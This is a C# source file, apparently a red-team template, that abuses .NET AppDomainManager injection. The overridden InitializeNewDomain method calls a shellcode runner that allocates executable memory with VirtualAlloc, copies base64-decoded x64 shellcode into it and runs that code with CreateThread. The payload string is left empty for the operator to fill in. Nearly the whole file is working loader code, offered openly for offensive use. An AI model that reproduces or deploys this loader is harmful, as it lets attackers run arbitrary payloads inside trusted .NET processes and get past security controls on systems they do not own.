<!--
# -------------------------------------------------------------------------------
# Copyright: (c) BLS OPS LLC.
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, version 3.
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
# You should have received a copy of the GNU General Public License
# along with this program. If not, see <https://www.gnu.org/licenses/>.
# -------------------------------------------------------------------------------
-->
using System;
using System.EnterpriseServices;
using System.Runtime.InteropServices;


public sealed class MyAppDomainManager : AppDomainManager
{
  
    public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
    {	
		//Uncomment to get debugging
		//System.Windows.Forms.MessageBox.Show("AppDomain - KaBoomBeacon!");
		
		// You have more control here than I am demonstrating. For example, you can set ApplicationBase, 
		// Or you can Override the Assembly Resolver, etc.
		bool res = ClassExample.Execute();
		
        return;
    }
}

public class ClassExample 
{         
	//private static UInt32 MEM_COMMIT = 0x1000;          
	//private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;          
	
	[DllImport("kernel32")]
	private static extern IntPtr VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);          
	
	[DllImport("kernel32")]
	private static extern IntPtr CreateThread(            
	UInt32 lpThreadAttributes,
	UInt32 dwStackSize,
	IntPtr lpStartAddress,
	IntPtr param,
	UInt32 dwCreationFlags,
	ref UInt32 lpThreadId           
	);
	[DllImport("kernel32")]
	private static extern UInt32 WaitForSingleObject(           
	IntPtr hHandle,
	UInt32 dwMilliseconds
	);          
	public static bool Execute()
	{
	  // x64 ShellCode Here
	  byte[] installercode = System.Convert.FromBase64String("");
	  
	  IntPtr funcAddr = VirtualAlloc(0, (UInt32)installercode.Length, 0x1000, 0x40);
	  Marshal.Copy(installercode, 0, (IntPtr)(funcAddr), installercode.Length);
	  IntPtr hThread = IntPtr.Zero;
	  UInt32 threadId = 0;
	  IntPtr pinfo = IntPtr.Zero;
	  hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
	  WaitForSingleObject(hThread, 0xFFFFFFFF);
	  return true;
	} 
}